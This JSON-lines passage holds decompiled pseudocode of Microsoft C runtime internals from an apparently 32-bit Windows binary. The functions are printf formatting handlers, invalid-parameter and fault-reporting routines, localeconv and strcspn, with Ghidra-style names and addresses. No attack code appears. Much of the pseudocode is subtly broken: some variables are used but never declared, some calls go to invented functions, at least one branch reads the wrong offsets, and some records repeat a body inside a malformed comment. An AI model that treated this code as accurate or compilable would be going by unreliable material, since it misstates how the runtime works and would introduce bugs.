1) == 0)) {\n        __crt_stdio_output::\n        write_multiple_characters<class___crt_stdio_output::string_output_adapter<wchar_t>,char>\n        ((string_output_adapter<wchar_t> *)(param_1 + 0x89), '0', iVar9, (int *)(param_1 + 3)); \n    }\n    FUN_1001d9ce((uint)param_1); \n    \n    if ((-1 < *(int *)(param_1 + 3)) && ((*(uint *)(param_1 + 4) >> 2 & 1) != 0)) {\n        __crt_stdio_output::\n        write_multiple_characters<class___crt_stdio_output::string_output_adapter<wchar_t>,char>\n        ((string_output_adapter<wchar_t> *)(param_1 + 0x89), ' ', iVar9, (int *)(param_1 + 3)); \n    }\nLAB_1001ce3b: \n    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "type_case_a", "Address": "1001cfc4", "Source Code": "undefined4 __fastcall type_case_a(uint *param_1)\n{\n    undefined (*formatting_buffer_ptr)[16]; \n    bool is_buffer_large_enough; \n    uint buffer_count; \n    undefined (*another_formatting_buffer_ptr)[16]; \n    int character_value; \n    uint param_1_10; \n    uint param_1_0; \n    uint param_1_1; \n    __acrt_ptd **locale_pointers; \n    char *scratch_data_ptr; \n    char *char_iterator; \n    char current_character; \n    param_1[8] |= 0x10; \n    \n    \n    if ((int)param_1[10] < 0) {\n        \n        if ((*(char *)((int)param_1 + 0x31) == 'a') || (*(char *)((int)param_1 + 0x31) == 'A')) {\n            param_1[10] = 0xd; \n        } else {\n            param_1[10] = 6; \n        }\n    } \n    \n    else if ((param_1[10] == 0) && ((*(char *)((int)param_1 + 0x31) == 'g' || (*(char *)((int)param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1; \n    }\n    \n    formatting_buffer_ptr = (undefined (*)[16])(param_1 + 0x10); \n    is_buffer_large_enough = __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>((formatting_buffer *)formatting_buffer_ptr, param_1[10] + 0x15d); \n    if (!is_buffer_large_enough) {\n        buffer_count = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)formatting_buffer_ptr); \n        param_1[10] = buffer_count - 0x15d; \n    }\n    \n    another_formatting_buffer_ptr = (undefined (*)[16])param_1[0x111]; \n    if (another_formatting_buffer_ptr == (undefined (*)[16])0x0) {\n        another_formatting_buffer_ptr = formatting_buffer_ptr; \n    }\n    param_1[0xd] = (uint)another_formatting_buffer_ptr; \n    param_1[5] += 8; \n    buffer_count = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)formatting_buffer_ptr); \n    locale_pointers = (__acrt_ptd **)param_1[2]; \n    character_value = (int)*(char *)((int)param_1 + 0x31); \n    param_1_0 = *param_1; \n    param_1_10 = param_1[10]; \n    scratch_data_ptr = __crt_stdio_output::formatting_buffer::scratch_data<char>((formatting_buffer *)formatting_buffer_ptr); \n    param_1_1 = param_1[1]; \n    \n    \n    ___acrt_fp_format((double *)&param_1[5], another_formatting_buffer_ptr, buffer_count, scratch_data_ptr, buffer_count, character_value, param_1_10, param_1_0, param_1_1, locale_pointers);\n    \n    \n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        __crt_stdio_output::force_decimal_point((char *)param_1[0xd], (__crt_locale_pointers *)param_1[2]); \n    }\n    \n    \n    if (((*(char *)((int)param_1 + 0x31) == 'g') || (*(char *)((int)param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        __crt_stdio_output::crop_zeroes((char *)param_1[0xd], (__crt_locale_pointers *)param_1[2]); \n    }\n    \n    scratch_data_ptr = (char *)param_1[0xd]; \n    if (*scratch_data_ptr == '-') { \n        param_1[8] |= 0x40; \n        scratch_data_ptr++; \n        param_1[0xd] = (uint)scratch_data_ptr; \n    }\n    \n    char_iterator = (char *)param_1[0xd]; \n    current_character = *char_iterator; \n    \n    if (((current_character == 'i') || (current_character == 'I')) || ((current_character == 'n' || (current_character == 'N')))) {\n        *(undefined *)((int)param_1 + 0x31) = 0x73; \n    }\n    \n    \n    while (*char_iterator != '\\0') {\n        char_iterator++; \n    }\n    param_1[0xe] = (int)char_iterator - (int)(char_iterator + 1); \n    return CONCAT31((int3)((uint)scratch_data_ptr >> 8), 1); \n}"}
{"Function Name": "type_case_a", "Address": "1001d11e", "Source Code": "undefined4 __fastcall type_case_a(uint *param_1)\n{\n    undefined (*formatting_buffer_ptr)[16]; \n    char current_char; \n    bool is_buffer_large_enough; \n    uint temp_count; \n    undefined (*another_formatting_buffer_ptr)[16]; \n    int char_value; \n    char *char_data_ptr; \n    uint param_value_10; \n    uint param_value_0; \n    uint param_value_1; \n    __acrt_ptd **locale_pointers_ptr; \n    param_1[8] = param_1[8] | 0x10; \n    if ((int)param_1[10] < 0) { \n        \n        if ((*(short *)((int)param_1 + 0x32) == 0x61) || (*(short *)((int)param_1 + 0x32) == 0x41)) {\n            param_1[10] = 0xd; \n        } else {\n            param_1[10] = 6; \n        }\n    } else if ((param_1[10] == 0) && ((*(short *)((int)param_1 + 0x32) == 0x67 || (*(short *)((int)param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1; \n    }\n    formatting_buffer_ptr = (undefined (*)[16])(param_1 + 0x10); \n    is_buffer_large_enough = __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>((formatting_buffer *)formatting_buffer_ptr, param_1[10] + 0x15d); \n    if (!is_buffer_large_enough) { \n        temp_count = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)formatting_buffer_ptr); \n        param_1[10] = temp_count - 0x15d; \n    }\n    another_formatting_buffer_ptr = (undefined (*)[16])param_1[0x111]; \n    if (another_formatting_buffer_ptr == (undefined (*)[16])0x0) { \n        another_formatting_buffer_ptr = formatting_buffer_ptr; \n    }\n    param_1[0xd] = (uint)another_formatting_buffer_ptr; \n    param_1[5] = param_1[5] + 8; \n    temp_count = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)formatting_buffer_ptr); \n    locale_pointers_ptr = (__acrt_ptd **)param_1[2]; \n    char_value = (int)*(char *)((int)param_1 + 0x32); \n    param_value_1 = param_1[1]; \n    param_value_0 = *param_1; \n    param_value_10 = param_1[10]; \n    char_data_ptr = __crt_stdio_output::formatting_buffer::scratch_data<char>((formatting_buffer *)formatting_buffer_ptr); \n    ___acrt_fp_format((double *)&param_1, another_formatting_buffer_ptr, __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)formatting_buffer_ptr), char_data_ptr, temp_count, char_value, param_value_10, param_value_0, param_value_1, locale_pointers_ptr); \n    \n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        __crt_stdio_output::force_decimal_point((char *)param_1[0xd], (__crt_locale_pointers *)param_1[2]); \n    }\n    \n    if (((*(short *)((int)param_1 + 0x32) == 0x67) || (*(short *)((int)param_1 + 0x32) == 0x47)) && ((param_1[8] >> 5 & 1) == 0)) {\n        __crt_stdio_output::crop_zeroes((char *)param_1[0xd], (__crt_locale_pointers *)param_1[2]); \n    }\n    char_data_ptr = (char *)param_1[0xd]; \n    if (*char_data_ptr == '-') { \n        param_1[8] = param_1[8] | 0x40; \n        char_data_ptr = char_data_ptr + 1; \n        param_1[0xd] = (uint)char_data_ptr; \n    }\n    char *processing_char_ptr = (char *)param_1[0xd]; \n    current_char = *processing_char_ptr; \n    undefined3 return_value = (undefined3)((uint)char_data_ptr >> 8); \n    \n    if (((current_char == 'i') || (current_char == 'I')) || ((current_char == 'n' || (current_char == 'N')))) {\n        return_value = 0; \n        *(undefined2 *)((int)param_1 + 0x32) = 0x73; \n    }\n    char_data_ptr = processing_char_ptr + 1; \n    while (*processing_char_ptr != '\\0') { \n        processing_char_ptr++; \n    }\n    param_1[0xe] = (int)processing_char_ptr - (int)char_data_ptr; \n    return CONCAT31(return_value, 1); \n}"}
{"Function Name": "type_case_c_tchar", "Address": "1001d290", "Source Code": "undefined4 __fastcall type_case_c_tchar(__uint64 *param_1)\n{\n    bool isWideChar; \n    uint sizeInBytes; \n    errno_t errorCode; \n    __uint64 *formatBufferPtr; \n    wchar_t wideChar; \n    \n    isWideChar = __crt_stdio_output::is_wide_character_specifier<char>\n    (*param_1, *(char *)((int)param_1 + 0x31), *(length_modifier *)((int)param_1 + 0x2c));\n    \n    \n    formatBufferPtr = *(__uint64 **)((int)param_1 + 0x444);\n    if (formatBufferPtr == (__uint64 *)0x0) {\n        formatBufferPtr = param_1 + 8;\n    }\n    \n    \n    *(int *)((int)param_1 + 0x14) += 4;\n    \n    \n    if (isWideChar) {\n        \n        wideChar = *(wchar_t *)(*(int *)((int)param_1 + 0x14) - 4);\n        \n        \n        sizeInBytes = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)formatBufferPtr);\n        \n        \n        errorCode = _wctomb_s((int *)(param_1 + 7), (char *)formatBufferPtr, sizeInBytes, wideChar);\n        \n        \n        if (errorCode != 0) {\n            *(undefined *)(param_1 + 6) = 1; \n        }\n    } else {\n        \n        *(formatting_buffer *)formatBufferPtr = *(formatting_buffer *)(*(int *)((int)param_1 + 0x14) - 4);\n        *(undefined4 *)(param_1 + 7) = 1; \n    }\n    \n    \n    *(__uint64 **)((int)param_1 + 0x34) = formatBufferPtr;\n    \n    \n    return CONCAT31((int3)((uint)formatBufferPtr >> 8), 1);\n}"}
{"Function Name": "type_case_c_tchar", "Address": "1001d320", "Source Code": "undefined4 __fastcall type_case_c_tchar(__uint64 *param_1)\n{\n    undefined2 twoByteValue; \n    bool isWideCharacter; \n    __uint64 *pointerValue; \n    __uint64 *offsetPointer; \n    *(undefined *)((int)param_1 + 0x3c) = 1; \n    *(int *)((int)param_1 + 0x14) += 4; \n    twoByteValue = *(undefined2 *)(*(int *)((int)param_1 + 0x14) + -4); \n    isWideCharacter = __crt_stdio_output::is_wide_character_specifier<wchar_t> \n    (*param_1, *(wchar_t *)((int)param_1 + 0x32), \n    *(length_modifier *)((int)param_1 + 0x2c)); \n    offsetPointer = param_1 + 8; \n    if (isWideCharacter) { \n        pointerValue = *(__uint64 **)((int)param_1 + 0x444); \n        if (pointerValue == (__uint64 *)0x0) { \n            pointerValue = offsetPointer; \n        }\n        *(undefined2 *)pointerValue = twoByteValue; \n    } else { \n        pointerValue = *(__uint64 **)((int)param_1 + 0x444); \n        if (pointerValue == (__uint64 *)0x0) { \n            pointerValue = offsetPointer; \n        }\n        if (__mbtowc_l((wchar_t *)pointerValue, (char *)param_1, \n            (*(_locale_t *)(param_1 + 1))->locinfo->lc_codepage, \n            *(_locale_t *)(param_1 + 1)) < 0) { \n            *(undefined *)(param_1 + 6) = 1; \n        }\n    }\n    pointerValue = *(__uint64 **)((int)param_1 + 0x444); \n    if (pointerValue != (__uint64 *)0x0) { \n        offsetPointer = pointerValue; \n    }\n    *(__uint64 **)((int)param_1 + 0x34) = offsetPointer; \n    *(undefined4 *)(param_1 + 7) = 1; \n    return CONCAT31((int3)((uint)pointerValue >> 8), 1); \n}"}
{"Function Name": "FUN_1001d3b8", "Address": "1001d3b8", "Source Code": "uint __thiscall FUN_1001d3b8(void *this,uint param_1,char param_2)\n{\n    uint integerSize; \n    undefined4 *errorPointer; \n    uint valueRead; \n    uint secondValueRead; \n    bool isNonZero; \n    \n    integerSize = __crt_stdio_output::to_integer_size(*(length_modifier *)((int)this + 0x2c));\n    \n    *(int *)((int)this + 0x14) += 4;\n    \n    if (integerSize == 1) {\n        valueRead = (uint)*(byte *)(*(int *)((int)this + 0x14) - 4); \n        \n        if ((*(uint *)((int)this + 0x20) >> 4 & 1) != 0) {\n            valueRead = (uint)*(char *)(*(int *)((int)this + 0x14) - 4);\n        }\n    } else if (integerSize == 2) {\n        valueRead = (uint)*(ushort *)(*(int *)((int)this + 0x14) - 4); \n        \n        if ((*(uint *)((int)this + 0x20) >> 4 & 1) != 0) {\n            valueRead = (uint)*(short *)(*(int *)((int)this + 0x14) - 4);\n        }\n    } else if (integerSize == 4) {\n        valueRead = *(uint *)(*(int *)((int)this + 0x14) - 8); \n        secondValueRead = *(uint *)(*(int *)((int)this + 0x14) - 4); \n    } else if (integerSize == 8) {\n        *(int *)((int)this + 0x14) += 8; \n        valueRead = *(uint *)(*(int *)((int)this + 0x14) - 8); \n        secondValueRead = *(uint *)(*(int *)((int)this + 0x14) - 4); \n    } else {\n        \n        errorPointer = (undefined4 *)FUN_100253b8();\n        *errorPointer = 0x16; \n        return FUN_1001de96() & 0xffffff00; \n    }\n    secondValueRead = (int)valueRead >> 0x1f; \n    \n    if ((((*(uint *)((int)this + 0x20) >> 4 & 1) != 0) && ((int)secondValueRead < 1)) && ((int)secondValueRead < 0)) {\n        isNonZero = valueRead != 0; \n        valueRead = -valueRead; \n        secondValueRead = -(secondValueRead + isNonZero); \n        *(uint *)((int)this + 0x20) |= 0x40; \n    }\n    \n    \n    if (*(int *)((int)this + 0x28) < 0) {\n        *(undefined4 *)((int)this + 0x28) = 1; \n    } else {\n        *(uint *)((int)this + 0x20) &= 0xfffffff7; \n        \n        if (0x200 < *(int *)((int)this + 0x28)) {\n            *(undefined4 *)((int)this + 0x28) = 0x200;\n        }\n    }\n    \n    \n    if ((valueRead | secondValueRead) == 0) {\n        *(uint *)((int)this + 0x20) &= 0xffffffdf;\n    }\n    \n    *(undefined *)((int)this + 0x3c) = 0; \n    \n    if (integerSize == 8) {\n        FUN_1001bd75(this, CONCAT44(secondValueRead, valueRead), param_1, param_2);\n    } else {\n        FUN_1001bc7d(this, valueRead, param_1, param_2);\n    }\n    \n    char *pointerFlag = (char *)(*(uint *)((int)this + 0x20) >> 7); \n    \n    if ((((uint)pointerFlag & 1) != 0) && ((*(int *)((int)this + 0x38) == 0 || (*((char **)((int)this + 0x34)) != '0')))) {\n        *(int *)((int)this + 0x34) -= 1; \n        **(undefined **)((int)this + 0x34) = 0x30; \n        *(int *)((int)this + 0x38) += 1; \n    }\n    \n    return CONCAT31((int3)((uint)pointerFlag >> 8), 1); \n}"}
{"Function Name": "FUN_1001d506", "Address": "1001d506", "Source Code": "uint this_call process_length_modifier(void *this,uint param_1,char param_2)\n{\n    \n    uint length_modifier_value = __crt_stdio_output::to_integer_size(*(length_modifier *)((int)this + 0x2c));\n    uint value, sign_bit;\n    bool is_non_zero;\n    \n    if (length_modifier_value == 1 || length_modifier_value == 2) {\n        \n        *(int *)((int)this + 0x14) += 4;\n        \n        if ((*(uint *)((int)this + 0x20) >> 4 & 1) == 0) {\n            value = (length_modifier_value == 1) ? (uint)*(byte *)(*(int *)((int)this + 0x14) - 4) : (uint)*(ushort *)(*(int *)((int)this + 0x14) - 4);\n        } else {\n            value = (length_modifier_value == 1) ? (uint)*(char *)(*(int *)((int)this + 0x14) - 4) : (uint)*(short *)(*(int *)((int)this + 0x14) - 4);\n        }\n    } \n    \n    else if (length_modifier_value == 4) {\n        \n        *(int *)((int)this + 0x14) += 4;\n        \n        value = (uint)*(uint *)(*(int *)((int)this + 0x14) - 4);\n    } \n    \n    else if (length_modifier_value == 8) {\n        \n        *(int *)((int)this + 0x14) += 8;\n        \n        value = *(uint *)(*(int *)((int)this + 0x14) - 8);\n        sign_bit = *(uint *)(*(int *)((int)this + 0x14) - 4);\n        goto LAB_1001d5b7; \n    } \n    \n    else {\n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8();\n        *error_code_pointer = 0x16; \n        return FUN_1001de96() & 0xffffff00; \n    }\n    \n    sign_bit = (int)value >> 0x1f;\nLAB_1001d5b7:\n    \n    if ((((*(uint *)((int)this + 0x20) >> 4 & 1) != 0) && ((int)sign_bit < 1)) && ((int)sign_bit < 0)) {\n        is_non_zero = value != 0; \n        value = -value; \n        sign_bit = -(sign_bit + is_non_zero); \n        *(uint *)((int)this + 0x20) |= 0x40; \n    }\n    \n    \n    if (*(int *)((int)this + 0x28) < 0) {\n        *(undefined4 *)((int)this + 0x28) = 1; \n    } else {\n        *(uint *)((int)this + 0x20) &= 0xfffffff7; \n        \n        if (0x200 < *(int *)((int)this + 0x28)) {\n            *(undefined4 *)((int)this + 0x28) = 0x200;\n        }\n    }\n    \n    \n    if ((value | sign_bit) == 0) {\n        *(uint *)((int)this + 0x20) &= 0xffffffdf;\n    }\n    \n    \n    *(undefined *)((int)this + 0x3c) = 1;\n    \n    \n    if (length_modifier_value == 8) {\n        FUN_1001bdfc(this, CONCAT44(sign_bit, value), param_1, param_2);\n    } else {\n        FUN_1001bcef(this, value, param_1, param_2);\n    }\n    \n    \n    short *short_pointer = (short *)(*(uint *)((int)this + 0x20) >> 7);\n    if ((((uint)short_pointer & 1) != 0) && ((*(int *)((int)this + 0x38) == 0 || (short_pointer = *(short **)((int)this + 0x34), *short_pointer != 0x30)))) {\n        *(int *)((int)this + 0x34) -= 2; \n        **(undefined2 **)((int)this + 0x34) = 0x30; \n        *(int *)((int)this + 0x38) += 1; \n    }\n    \n    \n    return CONCAT31((int3)((uint)short_pointer >> 8), 1);\n}"}
{"Function Name": "type_case_s_compute_narrow_string_length", "Address": "1001d821", "Source Code": "int __thiscall type_case_s_compute_narrow_string_length(void *this, int maxLength)\n{\n    \n    byte *byteArrayPtr = *(byte **)((int)this + 0x34);\n    \n    int lengthCounter = 0;\n    \n    if (0 < maxLength) {\n        \n        do {\n            \n            if (*byteArrayPtr == 0) {\n                return lengthCounter; \n            }\n            \n            if ((*(ushort *)(**(int ***)((int)this + 8) + (uint)*byteArrayPtr * 2) & 0x8000) != 0) {\n                byteArrayPtr++; \n            }\n            byteArrayPtr++; \n            lengthCounter++; \n        } while (lengthCounter < maxLength); \n    }\n    return lengthCounter; \n}"}
{"Function Name": "write_stored_string_tchar", "Address": "1001d925", "Source Code": "void __fastcall write_stored_string_tchar(int param_1)\n{\n    wchar_t _WCh; \n    errno_t eVar1; \n    wchar_t *pwVar3; \n    int iVar2; \n    \n    if ((*(char *)(param_1 + 0x3c) == '\\0') || (*(int *)(param_1 + 0x38) < 1)) {\n        \n        __crt_stdio_output::string_output_adapter<char>::write_string\n        ((string_output_adapter<char> *)(param_1 + 0x448), *(char **)(param_1 + 0x34),\n        *(int *)(param_1 + 0x38), (int *)(param_1 + 0x18),\n        (__crt_deferred_errno_cache *)(param_1 + 0xc));\n    }\n    else {\n        \n        pwVar3 = *(wchar_t **)(param_1 + 0x34);\n        iVar2 = 0; \n        \n        if (*(int *)(param_1 + 0x38) != 0) {\n            do {\n                _WCh = *pwVar3++; \n                char local_10[8]; \n                int local_14; \n                \n                eVar1 = _wctomb_s(&local_14, local_10, 6, _WCh);\n                \n                if ((eVar1 != 0) || (local_14 == 0)) {\n                    *(undefined4 *)(param_1 + 0x18) = 0xffffffff; \n                    break; \n                }\n                \n                __crt_stdio_output::string_output_adapter<char>::write_string\n                ((string_output_adapter<char> *)(param_1 + 0x448), local_10, local_14,\n                (int *)(param_1 + 0x18), (__crt_deferred_errno_cache *)(param_1 + 0xc));\n                iVar2++; \n            } while (iVar2 != *(int *)(param_1 + 0x38)); \n        }\n    }\n    return; \n}"}
{"Function Name": "FUN_1001d9ce", "Address": "1001d9ce", "Source Code": "undefined4 __fastcall FUN_1001d9ce(uint param_1)\n{\n    int *piVar2; \n    char *_SrcCh; \n    uint local_8; \n    local_8 = param_1; \n    \n    if ((*(char *)(param_1 + 0x3c) == '\\0') && (piVar2 = *(int **)(param_1 + 0x38), 0 < (int)piVar2))\n    {\n        _SrcCh = *(char **)(param_1 + 0x34); \n        \n        for (int iVar3 = 0; iVar3 != *(int *)(param_1 + 0x38); iVar3++)\n        {\n            local_8 = local_8 & 0xffff0000; \n            \n            piVar2 = (int *)__mbtowc_l((wchar_t *)&local_8, _SrcCh,\n                (*(_locale_t *)(param_1 + 8))->locinfo->lc_codepage,\n                *(_locale_t *)(param_1 + 8));\n            \n            if ((int)piVar2 < 1) {\n                *(undefined4 *)(param_1 + 0x18) = 0xffffffff; \n                break; \n            }\n            \n            __crt_stdio_output::string_output_adapter<wchar_t>::write_character\n                ((string_output_adapter<wchar_t> *)(param_1 + 0x448), (wchar_t)local_8,\n                (int *)(param_1 + 0x18));\n            _SrcCh += (int)piVar2; \n        }\n    }\n    else {\n        piVar2 = (int *)(param_1 + 0x18); \n        \n        __crt_stdio_output::string_output_adapter<wchar_t>::write_string\n            ((string_output_adapter<wchar_t> *)(param_1 + 0x448), *(wchar_t **)(param_1 + 0x34),\n            *(int *)(param_1 + 0x38), piVar2, (__crt_deferred_errno_cache *)(param_1 + 0xc));\n    }\n    \n    return CONCAT31((int3)((uint)piVar2 >> 8), 1);\n}"}
{"Function Name": "___stdio_common_vsprintf_s", "Address": "1001db34", "Source Code": "void __cdecl\n___stdio_common_vsprintf_s\n(undefined4 param_1, undefined4 param_2, char *param_3, uint param_4, char *param_5,\n__crt_locale_pointers *param_6, char *param_7)\n{\n    \n    common_vsprintf_s<char>(CONCAT44(param_2, param_1), param_3, param_4, param_5, param_6, param_7);\n}"}
{"Function Name": "___stdio_common_vswprintf_s", "Address": "1001db58", "Source Code": "void __cdecl\n___stdio_common_vswprintf_s\n(undefined4 param_1, undefined4 param_2, wchar_t *param_3, uint param_4, wchar_t *param_5,\n__crt_locale_pointers *param_6, char *param_7)\n{\n    \n    \n    common_vsprintf_s<wchar_t>(CONCAT44(param_2, param_1), param_3, param_4, param_5, param_6, param_7);\n}"}
{"Function Name": "FUN_1001db7c", "Address": "1001db7c", "Source Code": "float10 __cdecl FUN_1001db7c(double input_double, int *error_code)\n{\n    ushort ushort_value; \n    uint control_word; \n    int lower_double_part; \n    float10 result_float; \n    uint upper_double_part; \n    \n    if (error_code == (int *)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        result_float = (float10)0; \n    }\n    else {\n        control_word = __ctrlfp(0x133f, 0xffff); \n        lower_double_part = SUB84(input_double, 0); \n        upper_double_part = (uint)((ulonglong)input_double >> 0x20); \n        \n        if ((input_double._6_2_ & 0x7ff0) == 0x7ff0) {\n            *error_code = -1; \n            lower_double_part = __sptype(lower_double_part, upper_double_part); \n            \n            if (lower_double_part == 1 || lower_double_part == 2 || lower_double_part == 3) {\n                __ctrlfp(control_word, 0xffff); \n                return (float10)input_double; \n            }\n            calculated_value = DAT_10048578 + input_double; \n        }\n        else {\n            \n            if ((NAN(input_double) == (input_double == 0.0)) || \n                (ushort_value = FUN_1002b379(lower_double_part, upper_double_part), ushort_value == 0)) {\n                result_float = (float10)FUN_1002ba50(lower_double_part, upper_double_part, error_code); \n                __ctrlfp(control_word, 0xffff); \n                return (float10)(double)result_float; \n            }\n            *error_code = 0; \n            calculated_value = _DAT_1003e048; \n        }\n        result_float = (float10)__except1(upper_double_part, 0x17, input_double, calculated_value, control_word); \n    }\n    return result_float; \n}"}
{"Function Name": "FUN_1001dc78", "Address": "1001dc78", "Source Code": "void __cdecl FUN_1001dc78(void *memory_pointer) \n{\n    FID_conflict__free(memory_pointer); \n}"}
{"Function Name": "_terminate", "Address": "1001dc95", "Source Code": "void _terminate(void)\n{\n    code *functionPointer; \n    __acrt_ptd *threadLocalData; \n    threadLocalData = FUN_10029224(); \n    functionPointer = *(code **)(threadLocalData + 0xc); \n    if (functionPointer != (code *)0x0) { \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*functionPointer)(); \n    }\n    _abort(); \n}"}
{"Function Name": "___acrt_call_reportfault", "Address": "1001dcd1", "Source Code": "void __cdecl ___acrt_call_reportfault(int faultCode,DWORD exceptionCode,DWORD exceptionFlags)\n{\n    uint securityCookie; \n    BOOL isDebuggerPresent; \n    LONG exceptionFilterResult; \n    _EXCEPTION_POINTERS exceptionPointers; \n    EXCEPTION_RECORD exceptionRecord; \n    undefined4 contextInfo[39]; \n    \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if (faultCode != -1) {\n        FUN_10014b67();\n    }\n    \n    _memset(&exceptionRecord, 0, sizeof(exceptionRecord));\n    _memset(contextInfo, 0, sizeof(contextInfo));\n    \n    exceptionPointers.ExceptionRecord = &exceptionRecord;\n    exceptionPointers.ContextRecord = (PCONTEXT)contextInfo;\n    \n    contextInfo[0] = 0x10001;\n    \n    exceptionRecord.ExceptionCode = exceptionCode;\n    exceptionRecord.ExceptionFlags = exceptionFlags;\n    \n    isDebuggerPresent = IsDebuggerPresent();\n    \n    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);\n    \n    exceptionFilterResult = UnhandledExceptionFilter(&exceptionPointers);\n    \n    if (((exceptionFilterResult == 0) && (isDebuggerPresent == 0)) && (faultCode != -1)) {\n        FUN_10014b67();\n    }\n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    \n    return; \n}"}
{"Function Name": "FUN_1001de0c", "Address": "1001de0c", "Source Code": "void __cdecl FUN_1001de0c(undefined4 inputValue) \n{\n    globalVariable = inputValue; \n}"}
{"Function Name": "__invalid_parameter", "Address": "1001de1b", "Source Code": "void __cdecl\n__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,\nuintptr_t param_5)\n{\n    \n    uint uVar1 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    __acrt_ptd *p_Var2 = FUN_10029372();\n    \n    code *pcVar4 = (p_Var2 != (__acrt_ptd *)0x0) ? *(code **)(p_Var2 + 0x35c) : (code *)0x0;\n    \n    if (pcVar4 == (code *)0x0) {\n        byte bVar3 = (byte)DAT_1004e008 & 0x1f; \n        pcVar4 = (code *)((DAT_1004e008 ^ _DAT_1004fdc4) >> bVar3 | \n                          (DAT_1004e008 ^ _DAT_1004fdc4) << (0x20 - bVar3)); \n    }\n    \n    if (pcVar4 == (code *)0x0) {\n        __invoke_watson(param_1,param_2,param_3,param_4,param_5);\n    }\n    \n    (*(code *)PTR__guard_check_icall_1003a2f8)(param_1,param_2,param_3,param_4,param_5);\n    \n    \n    (*pcVar4)();\n    \n    ___security_check_cookie_4(uVar1);\n    \n    return; \n}"}
{"Function Name": "FUN_1001dea6", "Address": "1001dea6", "Source Code": "void handleInvalidParameters(void) \n{\n    checkInvalidParameters((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n    reportError((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n}"}
{"Function Name": "_localeconv", "Address": "1001def6", "Source Code": "_localeconv(void) \n{\n    __acrt_ptd *threadLocalDataPointer = FUN_10029224(); \n    int localeInfo = *(int *)(threadLocalDataPointer + 0x4c); \n    ___acrt_update_locale_info((int)threadLocalDataPointer, &localeInfo); \n    return *(lconv **)(localeInfo + 0x88); \n}"}
{"Function Name": "FUN_1001df20", "Address": "1001df20", "Source Code": "void FUN_1001df20(uint num_elements, uint element_size)\n{\n    \n    __calloc_base(num_elements, element_size);\n}"}
{"Function Name": "_strcspn", "Address": "1001df30", "Source Code": "size_t __cdecl _strcspn(char *inputString, char *controlString)\n{\n    byte currentChar; \n    byte *bitmapPointer; \n    size_t initialSegmentLength = 0; \n    byte bitmapArray[32] = {0}; \n    \n    while ((currentChar = *controlString++) != 0) {\n        bitmapPointer = bitmapArray + (currentChar >> 3); \n        *bitmapPointer |= 1 << (currentChar & 7); \n    }\n    \n    while ((currentChar = *inputString++) != 0) {\n        \n        if (bitmapArray[currentChar >> 3] & (1 << (currentChar & 7))) {\n            return initialSegmentLength; \n        }\n        initialSegmentLength++; \n    }\n    return initialSegmentLength; \n}"}
{"Function Name": "make_input_adapter_character_source<>", "Address": "1001e29f", "Source Code": "\\*\nvoid * __cdecl\nmake_input_adapter_character_source<>\n(void *param_1, undefined4 param_2, undefined4 param_3, undefined4 param_4, undefined *param_5)\n{\n    \n    input_adapter_character_source<>(param_1, param_2, param_3, param_4, param_5);\n    \n    \n    return param_1;\n}\n*\\ \n \nvoid * __cdecl\nmake_input_adapter_character_source<>\n(void *param_1, undefined4 param_2, undefined4 param_3, undefined4 param_4, undefined *param_5)\n{\n    input_adapter_character_source<>(param_1, param_2, param_3, param_4, param_5);\n    return param_1;\n}"}
{"Function Name": "parse_floating_point<>", "Address": "1001e2bd", "Source Code": "\\*\nvoid __cdecl parse_floating_point<>(int *param_1)\n{\n    floating_point_parse_result parse_result; \n    uint security_cookie; \n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if ((output_float_ptr == (float *)0x0) || (input_param == (int *)0x0)) {\n        undefined4 *error_code_ptr = (undefined4 *)FUN_100253b8(); \n        *error_code_ptr = 0x16; \n        FUN_1001de96(); \n    }\n    else {\n        \n        parse_result = FUN_1001e3b3(input_param, (int *)&stack0x00000008, result_storage);\n        \n        __crt_strtox::parse_floating_point_write_result<float>(parse_result, (floating_point_string *)result_storage, output_float_ptr);\n    }\n    \n    if ((output_ptr != (undefined *)0x0) && ((condition_check_1 | condition_check_2) == 0)) {\n        *output_ptr = 0; \n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return; \n}\n*\\ \n \nvoid __cdecl parse_floating_point<>(int *param_1)\n{\n    floating_point_parse_result parse_result;\n    uint security_cookie;\n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    if ((output_float_ptr == (float *)0x0) || (input_param == (int *)0x0)) {\n        undefined4 *error_code_ptr = (undefined4 *)FUN_100253b8();\n        *error_code_ptr = 0x16;\n        FUN_1001de96();\n    }\n    else {\n        parse_result = FUN_1001e3b3(input_param, (int *)&stack0x00000008, result_storage);\n        __crt_strtox::parse_floating_point_write_result<float>(parse_result, (floating_point_string *)result_storage, output_float_ptr);\n    }\n    if ((output_ptr != (undefined *)0x0) && ((condition_check_1 | condition_check_2) == 0)) {\n        *output_ptr = 0;\n    }\n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return;\n}"}
